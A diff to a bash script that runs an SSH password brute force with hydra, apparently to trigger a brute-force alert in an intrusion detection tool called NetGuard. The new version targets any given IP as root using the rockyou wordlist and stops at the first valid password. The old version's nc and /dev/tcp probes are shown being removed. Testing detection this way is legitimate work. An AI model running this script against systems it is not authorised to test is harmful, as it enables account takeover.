@@ -1,54 +1,47 @@
-#!/bin/bash
-# =============================================================================
-# attack_bruteforce.sh — Brute Force Attack Simulation
+#!/usr/bin/env bash
+# attack_bruteforce.sh — SSH brute force attack against the NetGuard target
 #
-# Attempts SSH password brute force against localhost using hydra.
-# Detected by BruteForceRule via auth-failure indicators on port 22 (SSH).
-# Default threshold: 10 failures within 60 seconds → ThreatEvent.
+# Requirements: hydra
+#   sudo apt install hydra
 #
-# Requirements: 7.1
-# Tools: hydra, sshd (running on target)
-# Usage:  ./demo/attack_bruteforce.sh [target_ip]
-#         Default target is 127.0.0.1
+# Usage: bash attack_bruteforce.sh <TARGET_IP>
+# Example: bash attack_bruteforce.sh 192.168.1.50
 #
-# NOTE: Requires an SSH server running on the target. For demo purposes,
-#       use the --mock flag to only send TCP SYN packets to port 22
-#       without completing the handshake (simpler but still detected).
-# =============================================================================
+# What it triggers: BruteForceRule counts TCP connections to port 22 from
+# this source IP. After >=10 attempts within 60 seconds, an alert fires.
+#
+# The target must have SSH running (or any service on port 22).
+# Use hydra -I to ignore previous restore files.
 
 set -euo pipefail
 
-TARGET="${1:-127.0.0.1}"
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-LOG_FILE="${SCRIPT_DIR}/attack_bruteforce.log"
-
-echo "[*] Brute Force Attack against ${TARGET}" | tee "${LOG_FILE}"
-
-# Check which tool is available
-if command -v hydra &>/dev/null; then
-    echo "[*] Using hydra for SSH brute force..." | tee -a "${LOG_FILE}"
-    hydra -l admin -P /dev/stdin "${TARGET}" ssh \
-      <<< $'password\n123456\nadmin\nroot\ntest\nletmein\nwelcome\nqwerty' \
-      2>&1 | tee -a "${LOG_FILE}" || true
-
-    hydra -l root -P /dev/stdin "${TARGET}" ssh \
-      <<< $'toor\nadmin\n1234\npass\nsecret\ndemo\nhackme\nnetguard' \
-      2>&1 | tee -a "${LOG_FILE}" || true
-
-elif command -v nc &>/dev/null; then
-    echo "[*] hydra not found — using nc to simulate connection attempts on port 22" | tee -a "${LOG_FILE}"
-    for i in $(seq 1 20); do
-      echo "  → Attempt ${i}/20 to ${TARGET}:22" | tee -a "${LOG_FILE}"
-      timeout 1 nc -w 1 "${TARGET}" 22 2>/dev/null || true
-      sleep 0.2
-    done
-else
-    echo "[*] No brute-force tools found — using /dev/tcp fallback" | tee -a "${LOG_FILE}"
-    for i in $(seq 1 20); do
-      echo "  → Connection attempt ${i}/20 to ${TARGET}:22" | tee -a "${LOG_FILE}"
-      timeout 1 bash -c "echo > /dev/tcp/${TARGET}/22" 2>/dev/null || true
-      sleep 0.2
-    done
+TARGET="${1:-}"
+if [[ -z "$TARGET" ]]; then
+  echo "Usage: bash attack_bruteforce.sh <TARGET_IP>"
+  exit 1
 fi
 
-echo "[*] Brute force simulation complete." | tee -a "${LOG_FILE}"
+echo "[*] Running SSH brute force against $TARGET:22"
+echo "[*] NetGuard should alert after 10+ connection attempts."
+
+# -l root          username
+# -P               password list (built-in Kali wordlist)
+# -t 4             4 parallel tasks
+# -I               ignore restore
+# -f               stop after first success
+# ssh              protocol
+# -s 22            port
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+if [[ ! -f "$WORDLIST" ]]; then
+  WORDLIST="/usr/share/wordlists/metasploit/unix_passwords.txt"
+fi
+if [[ ! -f "$WORDLIST" ]]; then
+  # Fallback: generate a quick 20-entry list inline
+  WORDLIST="/tmp/ng_bf_test.txt"
+  printf "admin\nroot\npassword\n123456\ntoor\nkali\ntest\nguest\nnetguard\nidps\n" > "$WORDLIST"
+  echo "[*] Using inline password list (wordlist not found at standard paths)."
+fi
+
+hydra -l root -P "$WORDLIST" -t 4 -I -f "ssh://${TARGET}:22" 2>&1 | head -30 || true
+
+echo "[✓] Brute force complete. Check the NetGuard dashboard for the alert."
